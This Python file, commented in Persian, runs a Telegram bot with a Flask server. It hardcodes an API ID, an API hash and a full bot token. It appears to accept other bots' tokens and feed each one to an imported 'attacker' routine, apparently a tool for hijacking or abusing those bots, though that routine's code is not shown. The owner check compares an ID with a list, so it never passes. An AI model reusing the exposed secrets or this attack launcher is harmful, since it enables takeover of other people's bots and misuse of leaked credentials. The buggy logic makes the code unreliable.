from flask import Flask, render_template
import threading
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup
import pyromod.listen
from attck import Bot
import tgcrypto

# سرور فلسک
server = Flask(__name__)

# اطلاعات ربات
ONWER = [2029106808,5861650867]
API_HASH = "8edc44bad592cbc7772df91460cce721"
API_ID = 17876846
bot = Client(name="botsaz", bot_token="5892949239:AAFLC319sZ_t9INl6OV29wWooce5dl0TFz8", api_hash=API_HASH, api_id=API_ID)

# هندلرها
@bot.on_message(filters.command("start"))
@bot.on_message(filters.regex("بازگشت"))
async def Start(client, message):
    if message.from_user.id == ONWER:
        reply = ReplyKeyboardMarkup(keyboard=[["ساخت ربات"]], resize_keyboard=True)
        await bot.send_message(chat_id=message.chat.id, text="خوش آمدید، انتخاب کنید", reply_markup=reply)

@bot.on_message(filters.regex("ساخت ربات"))
async def Create(client, message):
    if message.from_user.id == ONWER:
        reply = ReplyKeyboardMarkup(keyboard=[["بازگشت"]], resize_keyboard=True)
        token = await bot.ask(chat_id=message.chat.id, text="توکن ربات را ارسال کنید", reply_markup=reply, filters=filters.user(message.from_user.id))
        if token.text == "بازگشت":
            await Start(client, token)
        else:
            for i in token.text.splitlines():
                await bot.send_message(chat_id=message.chat.id, text="ربات فعال شد", reply_markup=ReplyKeyboardMarkup(keyboard=[["ساخت ربات"]], resize_keyboard=True))
                attacker = Bot()
                await attacker.attacker(name=i.split(":")[0], token=token.text)

# روت فلسک
@server.route('/on')
def home():
    return render_template('index.html')

# ران کردن بات تو ترد جدا
def run_bot():
    bot.run()

# ران کردن فلسک
def run_server():
    server.run(host="0.0.0.0", port=10000)

# اجرای هر دو
if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    run_server()